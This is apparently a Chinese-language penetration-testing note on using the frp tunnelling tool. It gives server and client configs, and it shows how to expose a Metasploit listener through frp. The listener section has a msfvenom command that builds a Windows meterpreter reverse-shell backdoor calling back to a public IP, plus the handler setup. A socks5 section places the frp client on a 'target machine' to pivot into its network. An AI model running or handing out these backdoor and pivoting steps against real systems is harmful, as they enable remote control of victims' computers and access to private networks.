frp是一款用于内网穿透的工具，可通过创建服务端和客户端，将内网的服务或应用暴露到外网，这样可以方便地访问内网中的服务或应用，实现内网穿透。
frp的服务端和客户端都支持多种操作系统，包括Linux、Windows以及Mac OS等，支持TCP和UDP协议，可以通过域名或IP地址访问,同时也支持多种认证方式和加密传输。

使用frp可以方便地在内网部署网站、搭建游戏服务、远程访问设备等，也可以用于企业内网的访问和控制。
frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 
等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公
网。


组成：客户端frpc.exe 服务端frps.exe
<https://github.com/fatedier/frp>
官方手册：<https://gofrp.org/zh-cn/docs/examples/vhost-http/>
## **服务端**
服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）
服务器修改配置文件 frps.ini：
[common]
bind_port = 7000 #程序工作端口

>服务端6000端口也要安全组开放，用于转发。

启动服务端：
./frps -c ./frps.ini

后台运行
nohup ./frps


## **客户端**
支持linux，Windows，Mac。
控制客户端-下载-解压-修改-启动
内网客户端端修改配置文件frpc.ini：
```
[common]
server_addr = 47.109.58.205
server_port = 7000 #frps工作端口，必须和上面frps保持一致
[msf]
type = tcp
local_ip = 127.0.0.1
local_port = 5555      #转发给本机的5555
remote_port = 6000   #服务端用6000端口转发给内网机5555端口
```
启动客户端：
./frpc -c ./frpc.ini



## **内网MSF内网穿透变公网**
```
生成后门
msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=6000 -f exe -o frp.exe

监听5555端口
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 127.0.0.1
set lport 5555
run
```


^
## **frp进行socks代理**
配置文件连接密码token和socks5代理的客户端示例：
```
[common]
server_addr = 192.168.239.123
server_port = 7778
token=Xa3BJf2l5enmN6Z7A8mv

[test_sock5]
type = tcp
remote_port =8111
plugin = socks5
plugin_user = 0HDFt16cLQJ
plugin_passwd = JTN276Gp
use_encryption = true
use_compression = true
```

####  **无密码实战**
公网服务端
* **frps.ini** 示例配置：

  ```
  [common]
  bind_port = 7000
  ```


目标机客户端
* **frpc.ini** 示例配置：

  ```
  [common]
  server_addr =  47.168.92.1
  server_port = 7000

  [socks5]
  type = tcp
  remote_port = 1080
  plugin = socks5
  ```
可以服务端放公网机，客户端放目标机。代理配置公网机IP。
也可以服务端和客户端都放目标机。代理配置目标机IP。

服务端可以挂在公网服务器常开，客户端自己连。

本地进行socks代理：socks5://47.168.92.1:1080